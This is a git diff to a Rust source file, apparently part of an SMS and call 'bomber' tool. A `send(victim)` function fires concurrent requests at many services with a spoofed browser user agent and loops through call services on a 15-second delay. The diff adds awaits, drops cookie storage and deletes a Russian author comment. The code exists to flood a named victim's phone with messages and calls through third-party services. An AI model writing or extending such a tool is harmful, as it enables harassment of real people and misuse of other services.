@@ -6,11 +6,10 @@ use std::time::Duration;
 
 const CALL_DELAY: u8 = 15;
 
-/// Вы бы знали как мне стыдно за такой колхозинг, но надеюсь это на время
 pub async fn send(victim: Victim) -> Result<(), Box<dyn std::error::Error>> {
     let mut s = Vec::new();
 
-    let services = construct_services_list(victim.clone());
+    let services = construct_services_list(victim.clone()).await;
     for service in services {
         let t = tokio::spawn(async move {
             send_single(service).await.expect("");
@@ -18,7 +17,7 @@ pub async fn send(victim: Victim) -> Result<(), Box<dyn std::error::Error>> {
         s.push(t);
     }
 
-    let services = construct_call_services_list(victim);
+    let services = construct_call_services_list(victim).await;
     let t = tokio::spawn(async move {
         for service in services {
             tokio::time::sleep(Duration::from_secs(CALL_DELAY as u64)).await;
@@ -37,7 +36,6 @@ pub async fn send(victim: Victim) -> Result<(), Box<dyn std::error::Error>> {
 async fn send_single(service: Service) -> Result<(), Box<dyn std::error::Error>> {
     let client = Client::builder()
         .user_agent("Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0")
-        .cookie_store(true)
         .default_headers(service.headers)
         .build()
         .expect("");
